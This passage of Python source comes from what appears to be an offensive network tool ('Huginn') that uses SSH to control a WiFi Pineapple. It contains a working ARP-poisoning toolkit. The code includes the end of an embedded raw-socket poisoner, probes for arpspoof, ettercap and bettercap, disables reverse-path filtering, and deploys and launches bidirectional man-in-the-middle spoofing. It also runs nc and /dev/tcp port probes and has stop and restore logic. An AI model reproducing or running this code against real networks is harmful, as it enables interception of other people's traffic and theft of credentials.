        t_tha = target_mac or b'\x00' * 6
        p_tha = peer_mac or b'\x00' * 6
        f1 = build_arp(t_dst, my_mac, ARP_REPLY, my_mac, peer_ip_b, t_tha, target_ip_b)
        f2 = build_arp(p_dst, my_mac, ARP_REPLY, my_mac, target_ip_b, p_tha, peer_ip_b)
        try:
            sock.send(f1)
            sock.send(f2)
        except OSError as exc:
            log('send failed: %s' % exc)
            time.sleep(1.0)
            continue
        n += 2
        if n % 30 == 0:
            log('sent %d ARP replies' % n)
        if time.time() > re_resolve_at and (not target_mac or not peer_mac):
            sock2 = open_arp_socket(args.iface)
            if not target_mac:
                target_mac = resolve_mac(sock2, my_mac, my_ip, target_ip_b, timeout=2.0)
            if not peer_mac:
                peer_mac = resolve_mac(sock2, my_mac, my_ip, peer_ip_b, timeout=2.0)
            sock2.close()
            re_resolve_at = time.time() + 60.0
        time.sleep(args.interval)


if __name__ == '__main__':
    main()
'''


def _probe_pineapple_arp_methods(cfg: dict[str, Any]) -> dict[str, Any]:
    """Probe which ARP-poisoning methods are usable on the Pineapple.

    Returns a dict with available_tools and missing_tools so callers (and the
    failure-path response) can show ground-truth capability instead of a stale
    'install dsniff' hint.
    """
    cmd = (
        'echo __ARPSPOOF__; command -v arpspoof || echo MISSING; '
        'echo __ETTERCAP__; command -v ettercap || echo MISSING; '
        'echo __BETTERCAP__; command -v bettercap || echo MISSING; '
        'echo __PYTHON3__; command -v python3 || echo MISSING; '
        'echo __PYTHON__; command -v python || echo MISSING; '
        'echo __SCAPY__; (python3 -c "import scapy.all" 2>/dev/null && echo OK) || echo MISSING; '
        "echo __RAW__; (python3 -c \"import socket; socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x806))\" 2>/dev/null && echo OK) || echo MISSING; "
        'echo __DSNIFF_FEED__; opkg list 2>/dev/null | grep -E "^dsniff " | head -1 || echo MISSING'
    )
    r = _run(cfg, cmd, timeout=15)
    out = r.get('stdout', '') or ''

    def section(tag: str) -> str:
        marker = f'__{tag}__'
        if marker not in out:
            return ''
        chunk = out.split(marker, 1)[1]
        next_idx = chunk.find('__')
        return chunk[:next_idx if next_idx >= 0 else len(chunk)].strip()

    arpspoof_path = section('ARPSPOOF')
    ettercap_path = section('ETTERCAP')
    bettercap_path = section('BETTERCAP')
    python3_path = section('PYTHON3')
    python_path = section('PYTHON')
    scapy_state = section('SCAPY')
    raw_state = section('RAW')
    dsniff_feed = section('DSNIFF_FEED')

    available: list[str] = []
    missing: list[str] = []

    def check(name: str, val: str, ok_when: str = 'starts_with_slash') -> None:
        if ok_when == 'OK':
            (available if val == 'OK' else missing).append(name)
        else:
            (available if val.startswith('/') else missing).append(name)

    check('arpspoof', arpspoof_path)
    check('ettercap', ettercap_path)
    check('bettercap', bettercap_path)
    check('python3', python3_path)
    check('python', python_path)
    check('python3-scapy', scapy_state, ok_when='OK')
    check('python3-raw-socket', raw_state, ok_when='OK')
    dsniff_in_feed = bool(re.match(r'^dsniff\s', dsniff_feed))

    return {
        'ok': r.get('ok', False) or bool(out),
        'available_tools': available,
        'missing_tools': missing,
        'arpspoof_path': arpspoof_path if arpspoof_path.startswith('/') else None,
        'ettercap_path': ettercap_path if ettercap_path.startswith('/') else None,
        'bettercap_path': bettercap_path if bettercap_path.startswith('/') else None,
        'python3_path': python3_path if python3_path.startswith('/') else None,
        'scapy_available': scapy_state == 'OK',
        'raw_socket_available': raw_state == 'OK',
        'dsniff_in_opkg_feed': dsniff_in_feed,
        'probe_stdout': out[-2000:],
    }


def _detect_arpspoof_iface(cfg: dict[str, Any], target_ip: str, peer_ip: str) -> dict[str, Any]:
    """Pick the Pineapple interface that reaches both target and peer.

    Returns {ok, interface, target_iface, peer_iface, route_output}.
    """
    qt = shlex.quote(target_ip)
    qp = shlex.quote(peer_ip)
    cmd = f'echo __T__; ip route get {qt} 2>&1; echo __P__; ip route get {qp} 2>&1'
    r = _run(cfg, cmd, timeout=8)
    out = r.get('stdout', '') or ''
    t_part = out.split('__T__', 1)[-1].split('__P__', 1)[0]
    p_part = out.split('__P__', 1)[-1] if '__P__' in out else ''
    t_m = re.search(r'\bdev\s+([A-Za-z0-9._\-]+)', t_part)
    p_m = re.search(r'\bdev\s+([A-Za-z0-9._\-]+)', p_part)
    t_iface = t_m.group(1) if t_m else None
    p_iface = p_m.group(1) if p_m else None
    if t_iface and p_iface and t_iface == p_iface:
        return {'ok': True, 'interface': t_iface, 'target_iface': t_iface, 'peer_iface': p_iface, 'route_output': out[-1000:]}
    return {
        'ok': False,
        'interface': t_iface or p_iface,
        'target_iface': t_iface,
        'peer_iface': p_iface,
        'route_output': out[-1000:],
        'error': (
            f'Could not pick a single interface that reaches both {target_ip} (via {t_iface}) '
            f'and {peer_ip} (via {p_iface}).'
        ),
    }


def _enable_ip_forwarding_remote(cfg: dict[str, Any]) -> dict[str, Any]:
    """Enable net.ipv4.ip_forward on the Pineapple and return its observed state."""
    r = _run(
        cfg,
        'sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; cat /proc/sys/net/ipv4/ip_forward',
        timeout=8,
    )
    state = (r.get('stdout', '') or '').strip()
    return {'ok': r.get('ok', False) and state == '1', 'value': state, 'raw': r}


# ───────── ARP-spoof forwarding resilience helpers (Pineapple side) ──────────
def _arpspoof_state_file() -> Path:
    """Kali-side state file for a running Pineapple ARP spoof session.

    Kept out of captures/ and reports/ so stop logic never depends on them.
    """
    return logs_dir() / 'arpspoof_state.json'


def _same_subnet(ip_a: str, ip_b: str, prefix: int) -> bool:
    """Return True when both IPs live in the same /prefix network."""
    import ipaddress as _ipaddr
    try:
        net_a = _ipaddr.ip_network(f'{ip_a}/{prefix}', strict=False)
        return _ipaddr.ip_address(ip_b) in net_a
    except ValueError:
        return False


def _peer_looks_server(peer_ip: str, cfg: dict[str, Any] | None = None) -> dict[str, Any]:
    """Heuristic: does peer_ip look like a server?

    Checks well-known server port responses with a fast connect probe from
    the Pineapple. Returns ``{'looks_server': bool, 'open_ports': [...]}``.
    """
    if not cfg:
        return {'looks_server': False, 'open_ports': []}
    ports = ['22', '80', '443', '445', '3389', '8080', '8443', '3306', '5432']
    # Single remote ash-compatible probe that tries each port with a short
    # timeout. `nc -w 1 -z` works on busybox if nc is present; fall back to
    # /dev/tcp (busybox sh supports it on most Pineapple firmware).
    checks = []
    for p in ports:
        checks.append(
            f'(nc -z -w 1 {shlex.quote(peer_ip)} {p} 2>/dev/null && echo OPEN:{p}) || '
            f'(exec 3<>/dev/tcp/{shlex.quote(peer_ip)}/{p} 2>/dev/null && echo OPEN:{p} && exec 3<&- && exec 3>&-)'
        )
    cmd = '; '.join(checks)
    r = _run(cfg, f'sh -c {shlex.quote(cmd)}', timeout=15)
    out = r.get('stdout', '') or ''
    open_ports = [int(m) for m in re.findall(r'OPEN:(\d+)', out)]
    return {'looks_server': bool(open_ports), 'open_ports': open_ports}


def _capture_and_set_forwarding_sysctls(
    cfg: dict[str, Any], iface: str,
) -> dict[str, Any]:
    """Record current sysctls, set forwarding/rp_filter=0 for resilient MITM.

    The server/laptop lost connectivity under the previous implementation
    because:
      * kernel rp_filter dropped forwarded packets whose reverse path
        disagreed with the route table (common when a MITM is injecting a
        different next-hop MAC).
      * per-interface ``forwarding=1`` was not set.

    Returns ``{ok, previous, applied}``. ``previous`` is replayed by
    ``_restore_forwarding_sysctls`` on stop so the operator's environment
    is left as we found it.
    """
    q = shlex.quote(iface)
    read_cmd = (
        'echo __IP_FORWARD__; cat /proc/sys/net/ipv4/ip_forward 2>/dev/null; '
        'echo __RP_ALL__; cat /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null; '
        f'echo __RP_IFACE__; cat /proc/sys/net/ipv4/conf/{q}/rp_filter 2>/dev/null; '
        f'echo __FWD_IFACE__; cat /proc/sys/net/ipv4/conf/{q}/forwarding 2>/dev/null; '
        'echo __RP_DEF__; cat /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null'
    )
    r_read = _run(cfg, read_cmd, timeout=10)
    raw = r_read.get('stdout', '') or ''

    def _section(tag: str) -> str:
        marker = f'__{tag}__'
        if marker not in raw:
            return ''
        chunk = raw.split(marker, 1)[1]
        nxt = chunk.find('__')
        return chunk[:nxt if nxt >= 0 else len(chunk)].strip()

    previous = {
        'net.ipv4.ip_forward': _section('IP_FORWARD'),
        'net.ipv4.conf.all.rp_filter': _section('RP_ALL'),
        f'net.ipv4.conf.{iface}.rp_filter': _section('RP_IFACE'),
        f'net.ipv4.conf.{iface}.forwarding': _section('FWD_IFACE'),
        'net.ipv4.conf.default.rp_filter': _section('RP_DEF'),
    }

    apply_cmd = (
        'sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; '
        'sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1; '
        'sysctl -w net.ipv4.conf.default.rp_filter=0 >/dev/null 2>&1; '
        f'sysctl -w net.ipv4.conf.{iface}.rp_filter=0 >/dev/null 2>&1; '
        f'sysctl -w net.ipv4.conf.{iface}.forwarding=1 >/dev/null 2>&1; '
        'echo DONE'
    )
    r_apply = _run(cfg, apply_cmd, timeout=10)
    applied = 'DONE' in (r_apply.get('stdout', '') or '')

    # Read back to confirm.
    r_check = _run(cfg, read_cmd, timeout=10)
    raw2 = r_check.get('stdout', '') or ''

    def _s2(tag: str) -> str:
        marker = f'__{tag}__'
        if marker not in raw2:
            return ''
        chunk = raw2.split(marker, 1)[1]
        nxt = chunk.find('__')
        return chunk[:nxt if nxt >= 0 else len(chunk)].strip()

    current = {
        'net.ipv4.ip_forward': _s2('IP_FORWARD'),
        'net.ipv4.conf.all.rp_filter': _s2('RP_ALL'),
        f'net.ipv4.conf.{iface}.rp_filter': _s2('RP_IFACE'),
        f'net.ipv4.conf.{iface}.forwarding': _s2('FWD_IFACE'),
    }
    return {
        'ok': applied and current.get('net.ipv4.ip_forward') == '1',
        'previous': previous,
        'current': current,
        'applied': applied,
    }


def _restore_forwarding_sysctls(
    cfg: dict[str, Any], previous: dict[str, str],
) -> dict[str, Any]:
    """Replay the sysctl values captured before we started spoofing.

    Empty-string previous values mean "this key was unreadable" (sysctl did
    not have it) - we simply skip them so we do not fabricate a default.
    """
    if not previous:
        return {'ok': True, 'restored': []}
    restored: list[str] = []
    segs: list[str] = []
    for key, val in previous.items():
        if val is None or val == '':
            continue
        # Tolerant - ignore non-numeric garbage.
        if not re.fullmatch(r'-?\d+', val.strip()):
            continue
        segs.append(f'sysctl -w {shlex.quote(f"{key}={val.strip()}")} >/dev/null 2>&1')
        restored.append(f'{key}={val.strip()}')
    if not segs:
        return {'ok': True, 'restored': []}
    cmd = '; '.join(segs) + '; echo DONE'
    r = _run(cfg, cmd, timeout=10)
    return {
        'ok': 'DONE' in (r.get('stdout', '') or ''),
        'restored': restored,
    }


def _write_arpspoof_state(state: dict[str, Any]) -> Path:
    path = _arpspoof_state_file()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(state, indent=2), encoding='utf-8')
    return path


def _read_arpspoof_state() -> dict[str, Any] | None:
    path = _arpspoof_state_file()
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text(encoding='utf-8'))
    except Exception:
        return None


def _clear_arpspoof_state() -> None:
    path = _arpspoof_state_file()
    try:
        path.unlink()
    except FileNotFoundError:
        pass
    except Exception:
        pass


def _start_arpspoof_with_arpspoof_bin(
    cfg: dict[str, Any], iface: str, target_ip: str, peer_ip: str,
) -> dict[str, Any]:
    fwd_pid = '/tmp/huginn_arpspoof_forward.pid'
    rev_pid = '/tmp/huginn_arpspoof_reverse.pid'
    fwd_log = '/tmp/huginn_arpspoof_forward.log'
    rev_log = '/tmp/huginn_arpspoof_reverse.log'
    q_iface = shlex.quote(iface)
    q_target = shlex.quote(target_ip)
    q_peer = shlex.quote(peer_ip)
    script = (
        f'rm -f {fwd_pid} {rev_pid} {fwd_log} {rev_log}; '
        f'( trap "" HUP; arpspoof -i {q_iface} -t {q_target} {q_peer} '
        f'</dev/null >{fwd_log} 2>&1 & echo $! > {fwd_pid} ); '
        f'( trap "" HUP; arpspoof -i {q_iface} -t {q_peer} {q_target} '
        f'</dev/null >{rev_log} 2>&1 & echo $! > {rev_pid} ); '
        f'sleep 1; '
        f'FWD=$(cat {fwd_pid} 2>/dev/null); REV=$(cat {rev_pid} 2>/dev/null); '
        f'echo PIDS:$FWD:$REV; '
        f'kill -0 $FWD 2>/dev/null && echo FWD_RUNNING || echo FWD_STOPPED; '
        f'kill -0 $REV 2>/dev/null && echo REV_RUNNING || echo REV_STOPPED'
    )
    r = _run(cfg, f'sh -c {shlex.quote(script)}', timeout=15)
    out = r.get('stdout', '') or ''
    m = re.search(r'PIDS:(\d+):(\d+)', out)
    pids = [int(m.group(1)), int(m.group(2))] if m else []
    fwd_ok = 'FWD_RUNNING' in out
    rev_ok = 'REV_RUNNING' in out
    if not pids or not fwd_ok or not rev_ok:
        return {
            'ok': False,
            'method': 'arpspoof',
            'error': f'arpspoof binary failed to start (fwd={fwd_ok}, rev={rev_ok}). Output: {out[:500]}',
            'pids': pids,
            'remote_log_paths': [fwd_log, rev_log],
            'remote_pid_paths': [fwd_pid, rev_pid],
            'stdout': out[-1500:],
        }
    return {
        'ok': True,
        'method': 'arpspoof',
        'pids': pids,
        'remote_log_paths': [fwd_log, rev_log],
        'remote_pid_paths': [fwd_pid, rev_pid],
    }


def _start_arpspoof_with_python_raw(
    cfg: dict[str, Any], iface: str, target_ip: str, peer_ip: str,
) -> dict[str, Any]:
    """Deploy and launch the embedded pure-Python ARP poisoner."""
    import base64 as _b64
    script_b64 = _b64.b64encode(_HUGINN_ARP_POISONER_SCRIPT.encode('utf-8')).decode('ascii')
    remote_script = '/tmp/huginn_arp_poison.py'
    pid_file = '/tmp/huginn_arpspoof_python.pid'
    log_file = '/tmp/huginn_arpspoof_python.log'
    q_iface = shlex.quote(iface)
    q_target = shlex.quote(target_ip)
    q_peer = shlex.quote(peer_ip)

    deploy_and_run = (
        f'rm -f {pid_file} {log_file}; '
        f'echo {shlex.quote(script_b64)} | base64 -d > {remote_script} && chmod 0700 {remote_script} || '
        f'{{ echo DEPLOY_FAIL; exit 11; }}; '
        f'echo DEPLOY_OK; '
        f'python3 {remote_script} --iface {q_iface} --target {q_target} --peer {q_peer} '
        f'--interval 2 --log {log_file} --pidfile {pid_file} </dev/null >/dev/null 2>&1; '
        f'for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do '
        f'  [ -f {pid_file} ] && break; sleep 0.2; '
        f'done; '
        f'PID=$(cat {pid_file} 2>/dev/null); '
        f'if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then '
        f'  echo PID:$PID; echo RUNNING; '
        f'else '
        f'  echo PID:$PID; echo NOT_RUNNING; echo LOG_TAIL:; tail -50 {log_file} 2>/dev/null; '
        f'fi'
    )
    r = _run(cfg, f'sh -c {shlex.quote(deploy_and_run)}', timeout=20)
    out = r.get('stdout', '') or ''
    if 'DEPLOY_FAIL' in out:
        return {
            'ok': False,
            'method': 'python3_raw_socket',
            'error': 'Failed to deploy ARP poisoner script to /tmp on the Pineapple.',
            'stdout': out[-1500:],
        }
    m = re.search(r'PID:(\d+)', out)
    pid = int(m.group(1)) if m else None
    running = 'RUNNING' in out and 'NOT_RUNNING' not in out
    if not pid or not running:
        log_tail = ''
        if 'LOG_TAIL:' in out:
            log_tail = out.split('LOG_TAIL:', 1)[1].strip()[-1500:]
        return {
            'ok': False,
            'method': 'python3_raw_socket',
            'error': f'Pure-Python ARP poisoner did not start. PID={pid} running={running}.',
            'pid': pid,
            'log_tail': log_tail,
            'stdout': out[-1500:],
            'remote_script': remote_script,
            'remote_log_paths': [log_file],
            'remote_pid_paths': [pid_file],
        }
    return {
        'ok': True,
        'method': 'python3_raw_socket',
        'pids': [pid],
        'remote_script': remote_script,
        'remote_log_paths': [log_file],
        'remote_pid_paths': [pid_file],
    }


def pineapple_arpspoof(
    target_ip: str,
    gateway_ip: str | None = None,
    cfg: dict[str, Any] | None = None,
    interface: str | None = None,
    *,
    peer_ip: str | None = None,
    mode: str | None = None,
) -> dict[str, Any]:
    """Start bidirectional ARP spoofing on the Pineapple.

    Always performs bidirectional poisoning. The implementation records and
    flips a small set of sysctls before starting so forwarded packets are
    not dropped by reverse-path filtering - the root cause of the
    "client can't reach server after arpspoof" behaviour we used to see.
    Those sysctls are restored on ``pineapple_stop_arpspoof``.

    Tries installed tools in order: arpspoof → python3 raw-socket fallback.
    The second host can be supplied either as ``gateway_ip`` (legacy) or
    ``peer_ip`` (preferred for symmetric MITM between two clients).
    ``mode`` is accepted for forward-compat and always treated as
    ``bidirectional``; there is no safe-oneway path.
    """
    import ipaddress as _ipaddr

    if cfg is None:
        return {'ok': False, 'error': 'cfg is required', 'scan_origin': 'pineapple'}

    second = peer_ip or gateway_ip
    if not target_ip or not second:
        return {
            'ok': False,
            'error': 'target_ip and peer_ip (or gateway_ip) are required',
            'scan_origin': 'pineapple',
        }
    try:
        _ipaddr.ip_address(target_ip)
        _ipaddr.ip_address(second)
    except ValueError as exc:
        return {'ok': False, 'error': f'Invalid IP address: {exc}', 'scan_origin': 'pineapple'}
    if target_ip == second:
        return {'ok': False, 'error': 'target_ip and peer_ip must be different', 'scan_origin': 'pineapple'}

    effective_mode = 'bidirectional'  # the only supported mode per user spec

    # Connectivity precheck
    conn = _check_connectivity(cfg)
    if not conn.get('ok'):
        return {
            'ok': False,
            'error': f"Pineapple SSH transport failed: {conn.get('error', 'unreachable')}",
            'failure_type': 'transport_failure',
            'scan_origin': 'pineapple',
        }

    # Auto-detect interface from routing if not supplied or default
    detected = _detect_arpspoof_iface(cfg, target_ip, second)
    chosen_iface = interface
    if not chosen_iface or chosen_iface == 'wlan2':
        if detected.get('ok'):
            chosen_iface = detected['interface']
        elif detected.get('interface'):
            chosen_iface = detected['interface']
        else:
            chosen_iface = interface or 'wlan2'
    if not re.fullmatch(r'[A-Za-z0-9._\-]+', chosen_iface or ''):
        return {
            'ok': False,
            'error': f'Invalid interface name: {chosen_iface!r}',
            'scan_origin': 'pineapple',
        }

    # Subnet sanity - both endpoints must be on the same L2 segment as the
    # chosen interface, otherwise poisoning cannot MITM the path.
    iface_info = _pineapple_interface_info(cfg, chosen_iface)
    iface_prefix: int | None = None
    iface_cidr: str | None = None
    iface_ipv4: str | None = None
    if iface_info.get('ok'):
        iface_prefix = iface_info.get('prefix')
        iface_cidr = iface_info.get('cidr')
        iface_ipv4 = iface_info.get('ipv4')
    subnet_ok = True
    if iface_prefix is not None and iface_ipv4:
        subnet_ok = (_same_subnet(iface_ipv4, target_ip, iface_prefix)
                     and _same_subnet(iface_ipv4, second, iface_prefix))

    # Probe capability
    probe = _probe_pineapple_arp_methods(cfg)

    # Capture previous sysctls, then apply resilient forwarding config. This
    # is the core fix for the "server/laptop stops connecting while arpspoof
    # is running" regression - forwarded packets were dropped by rp_filter.
    sysctls = _capture_and_set_forwarding_sysctls(cfg, chosen_iface)
    fwd = {'ok': sysctls.get('current', {}).get('net.ipv4.ip_forward') == '1',
           'value': sysctls.get('current', {}).get('net.ipv4.ip_forward', '?')}

    # Peer-looks-server heuristic (warning only - we still go bidirectional).
    server_probe = _peer_looks_server(second, cfg)

    diagnostics = {
        'available_tools': probe.get('available_tools', []),
        'missing_tools': probe.get('missing_tools', []),
        'arpspoof_path': probe.get('arpspoof_path'),
        'ettercap_path': probe.get('ettercap_path'),
        'bettercap_path': probe.get('bettercap_path'),
        'scapy_available': probe.get('scapy_available'),
        'raw_socket_available': probe.get('raw_socket_available'),
        'dsniff_in_opkg_feed': probe.get('dsniff_in_opkg_feed'),
        'route_detection': detected,
        'ip_forwarding_value': fwd.get('value'),
        'sysctls_previous': sysctls.get('previous', {}),
        'sysctls_current': sysctls.get('current', {}),
        'interface_info': iface_info,
        'subnet_ok': subnet_ok,
        'peer_server_probe': server_probe,
    }

    method_attempts: list[dict[str, Any]] = []
    started: dict[str, Any] | None = None

    if probe.get('arpspoof_path'):
        attempt = _start_arpspoof_with_arpspoof_bin(cfg, chosen_iface, target_ip, second)
        method_attempts.append({'method': 'arpspoof', 'ok': attempt.get('ok'), 'error': attempt.get('error')})
        if attempt.get('ok'):
            started = attempt

    if not started and probe.get('raw_socket_available') and probe.get('python3_path'):
        attempt = _start_arpspoof_with_python_raw(cfg, chosen_iface, target_ip, second)
        method_attempts.append({
            'method': 'python3_raw_socket',
            'ok': attempt.get('ok'),
            'error': attempt.get('error'),
            'log_tail': attempt.get('log_tail'),
        })
        if attempt.get('ok'):
            started = attempt

    if not started:
        # Restore sysctls we touched so we do not leave rp_filter disabled when
        # no actual spoofer ever ran.
        _restore_forwarding_sysctls(cfg, sysctls.get('previous', {}))
        return {
            'ok': False,
            'failure_type': 'dependency_or_capability_missing',
            'error': (
                'Pineapple-side ARP spoofing is not currently available on this '
                'firmware/feed because no supported ARP poisoner is installed.'
            ),
            'scan_origin': 'pineapple',
            'target_ip': target_ip,
            'peer_ip': second,
            'gateway_ip': second,
            'interface': chosen_iface,
            'ip_forwarding': fwd.get('ok', False),
            'method_attempts': method_attempts,
            'diagnostics': diagnostics,
            'available_tools': diagnostics['available_tools'],
            'missing_tools': diagnostics['missing_tools'],
            'suggestion': (
                'Install a compatible Pineapple/OpenWrt ARP poisoning method manually, '
                'or explicitly ask for Kali-local arpspoof.'
            ),
        }

    # Build warnings for the caller.
    warnings: list[str] = []
    if not subnet_ok:
        warnings.append(
            f'Pineapple interface {chosen_iface} IP {iface_ipv4}/{iface_prefix} does not '
            f'cover both {target_ip} and {second}. MITM may not reach both endpoints; '
            f'verify the Pineapple is on the same subnet.'
        )
    if server_probe.get('looks_server'):
        warnings.append(
            f'Peer {second} has open server-like ports {server_probe.get("open_ports")}. '
            f'Spoofing is still bidirectional as requested; kernel rp_filter has been '
            f'disabled on {chosen_iface} and IP forwarding enabled so the server path '
            f'keeps working. Run pineapple_stop_arpspoof to fully restore settings.'
        )

    # Persist state so pineapple_stop_arpspoof can stop exactly what we started
    # and replay the sysctl values. This is the piece that was missing before
    # - without it, stop had to fall back to pkill and sysctl state leaked.
    state = {
        'started_at': datetime.utcnow().isoformat(timespec='seconds') + 'Z',
        'origin': 'pineapple',
        'mode': effective_mode,
        'interface': chosen_iface,
        'interface_ipv4': iface_ipv4,
        'interface_cidr': iface_cidr,
        'target_ip': target_ip,
        'peer_ip': second,
        'method': started['method'],
        'pids': started.get('pids', []),
        'remote_log_paths': started.get('remote_log_paths', []),
        'remote_pid_paths': started.get('remote_pid_paths', []),
        'remote_script': started.get('remote_script'),
        'sysctls_previous': sysctls.get('previous', {}),
        'ip_forwarding_when_started': fwd.get('value', ''),
        'state': 'running',
        'warnings': warnings,
    }
    state_path = _write_arpspoof_state(state)

    return {
        'ok': True,
        'msg': (
            f'Pineapple-side bidirectional ARP spoof started between {target_ip} and '
            f'{second} on {chosen_iface}. IP forwarding {"enabled" if fwd.get("ok") else "state=" + str(fwd.get("value"))}. '
            f'rp_filter disabled on {chosen_iface} to keep forwarded packets alive. '
            f'Method: {started["method"]}. PIDs: {started.get("pids", [])}. '
            f'Logs: {", ".join(started.get("remote_log_paths", []))}.'
        ),
        'scan_origin': 'pineapple',
        'mode': effective_mode,
        'target_ip': target_ip,
        'peer_ip': second,
        'gateway_ip': second,
        'interface': chosen_iface,
        'interface_ipv4': iface_ipv4,
        'ip_forwarding': fwd.get('ok', False),
        'rp_filter_disabled': sysctls.get('current', {}).get(f'net.ipv4.conf.{chosen_iface}.rp_filter') == '0',
        'method': started['method'],
        'pids': started.get('pids', []),
        'remote_log_paths': started.get('remote_log_paths', []),
        'remote_pid_paths': started.get('remote_pid_paths', []),
        'remote_script': started.get('remote_script'),
        'method_attempts': method_attempts,
        'diagnostics': diagnostics,
        'state_file': str(state_path),
        'warnings': warnings,
    }


def pineapple_stop_arpspoof(cfg: dict[str, Any], kill_all: bool = False) -> dict[str, Any]:
    """Stop Huginn-started ARP spoofing on the Pineapple.

    By default this now stops *only* the PIDs recorded in the Kali-side
    state file (``logs/arpspoof_state.json``) and replays the sysctl values
    captured before we started - ``net.ipv4.ip_forward`` and the rp_filter
    / forwarding sysctls on the chosen interface. This prevents leaving the
    Pineapple with reverse-path filtering still disabled after the session
    ends. Pass ``kill_all=True`` to also pkill any stray ARP poisoners.
    """
    state = _read_arpspoof_state()
    sysctls_previous: dict[str, str] = {}
    tracked_pids: list[int] = []
    tracked_pid_files: list[str] = []
    iface_recorded: str | None = None
    if state and state.get('origin') == 'pineapple':
        sysctls_previous = state.get('sysctls_previous', {}) or {}
        tracked_pids = [int(p) for p in (state.get('pids') or []) if str(p).isdigit()]
        tracked_pid_files = list(state.get('remote_pid_paths') or [])
        iface_recorded = state.get('interface')

    pid_files = list(tracked_pid_files) or [
        '/tmp/huginn_arpspoof_forward.pid',
        '/tmp/huginn_arpspoof_reverse.pid',
        '/tmp/huginn_arpspoof_python.pid',
    ]
    kill_files = ' '.join(shlex.quote(p) for p in pid_files)

    # Counting "still running" via pgrep is brittle: the cmdline of the SSH
    # shell that runs this script literally contains the search patterns, so
    # naive pgrep self-matches. We walk /proc/<pid>/cmdline instead and skip
    # the current shell PID ($$).
    count_still = (
        'STILL=0; '
        'for P in /proc/[0-9]*; do '
        '  PID=$(basename "$P"); '
        '  [ "$PID" = "$$" ] && continue; '
        '  CL=$(tr "\\000" " " < "$P/cmdline" 2>/dev/null); '
        '  case "$CL" in '
        '    *huginn_arp_poison.py*|*"arpspoof -i "*) STILL=$((STILL+1));; '
        '  esac; '
        'done'
    )
    if kill_all:
        script = (
            f'PIDS_KILLED=""; '
            f'for PF in {kill_files}; do '
            f'  if [ -f "$PF" ]; then PID=$(cat "$PF"); '
            f'    [ -n "$PID" ] && kill "$PID" 2>/dev/null && PIDS_KILLED="$PIDS_KILLED $PID"; '
            f'    rm -f "$PF"; fi; '
            f'done; '
            f'pkill -f huginn_arp_poison.py 2>/dev/null; '
            f'pkill -f "arpspoof -i" 2>/dev/null; '
            f'sleep 0.3; '
            f'{count_still}; '
            f'echo KILLED:$PIDS_KILLED; echo STILL_RUNNING:$STILL'
        )
    else:
        script = (
            f'PIDS_KILLED=""; '
            f'for PF in {kill_files}; do '
            f'  if [ -f "$PF" ]; then PID=$(cat "$PF" 2>/dev/null); '
            f'    if [ -n "$PID" ]; then kill "$PID" 2>/dev/null && PIDS_KILLED="$PIDS_KILLED $PID"; fi; '
            f'    rm -f "$PF"; fi; '
            f'done; '
            f'sleep 0.3; '
            f'{count_still}; '
            f'echo KILLED:$PIDS_KILLED; echo STILL_RUNNING:$STILL'
        )

    r = _run(cfg, f'sh -c {shlex.quote(script)}', timeout=10)
    out = r.get('stdout', '') or ''
    m = re.search(r'KILLED:(.*)', out)
    killed_pids = [int(p) for p in (m.group(1) if m else '').split() if p.strip().isdigit()]
    still_m = re.search(r'STILL_RUNNING:(\d+)', out)
    still = int(still_m.group(1)) if still_m else 0

    # Restore sysctls recorded at start. This is the other half of the
    # server/laptop reliability fix - without restoration, ``rp_filter``
    # remains 0 indefinitely and future MITM-free traffic behaves oddly.
    restored = _restore_forwarding_sysctls(cfg, sysctls_previous) if sysctls_previous else {'ok': True, 'restored': []}

    # Clear the state file (keep the copy if stop failed so the operator can
    # diagnose it).
    state_existed = state is not None
    if still == 0:
        _clear_arpspoof_state()

    if state_existed:
        msg = (
            f'Stopped {len(killed_pids)} tracked Pineapple ARP spoof process(es) '
            f'(PIDs: {killed_pids}). Restored sysctls: {len(restored.get("restored", []))}.'
        )
    elif killed_pids:
        msg = (
            f'Stopped {len(killed_pids)} Pineapple ARP spoof process(es) (PIDs: {killed_pids}) '
            f'from legacy PID files. No Huginn state file was present.'
        )
    else:
        msg = (
            'No tracked arpspoof session found. Use kill_all=true to pkill any stray '
            'arpspoof/huginn_arp_poison processes on the Pineapple.'
        )
    if still > 0:
        msg += f' WARNING: {still} ARP-poisoner process(es) still running on the Pineapple.'
    return {
        'ok': True,
        'killed_pids': killed_pids,
        'killed_count': len(killed_pids),
        'still_running': still,
        'tracked_pids': tracked_pids,
        'interface': iface_recorded,
        'sysctls_restored': restored.get('restored', []),
        'state_found': state_existed,
        'msg': msg,
        'scan_origin': 'pineapple',
    }


def pineapple_nmap_scan(
    target: str,
    args: list[str] | None,
    cfg: dict[str, Any],
    interface: str | None = None,
) -> dict[str, Any]:
    """Run nmap on the Pineapple over SSH so scans originate from the
    Pineapple's upstream wireless interface (default wlan2) on the target network.

    This is distinct from the local ``run_nmap_scan`` which executes on Kali.

    Every failure path returns a populated ``error`` string and ``failure_type``
    field - callers must never see an empty error message.
    """
    if not target:
        return {
            'ok': False,
            'error': 'target is required',
            'failure_type': 'invalid_target',
            'scan_origin': 'pineapple',
        }

    safe_target = _validate_scan_target(target)
    if not safe_target:
        return {
            'ok': False,
            'error': f'Invalid target: {target!r}. Expected IPv4, CIDR, or range.',
            'failure_type': 'invalid_target',
            'scan_origin': 'pineapple',
            'target': target,
        }

    nmap_args = [str(x) for x in (args or ['-F'])]

    # Inject -e <iface> when the caller did not specify one. This guarantees
    # scans originate from the Pineapple's upstream interface rather than its
    # routing default.
    injected_iface: str | None = None
    if any(a == '-e' for a in nmap_args):
        for i, a in enumerate(nmap_args):
            if a == '-e' and i + 1 < len(nmap_args):
                injected_iface = _validate_interface(nmap_args[i + 1])
                break
    else:
        iface_req = interface if interface else 'wlan2'
        iface = _validate_interface(iface_req)
        if not iface:
            return {
                'ok': False,
                'error': f'Invalid interface name: {iface_req!r}',
                'failure_type': 'invalid_interface',
                'scan_origin': 'pineapple',
                'target': safe_target,
            }
        nmap_args = ['-e', iface] + nmap_args
        injected_iface = iface

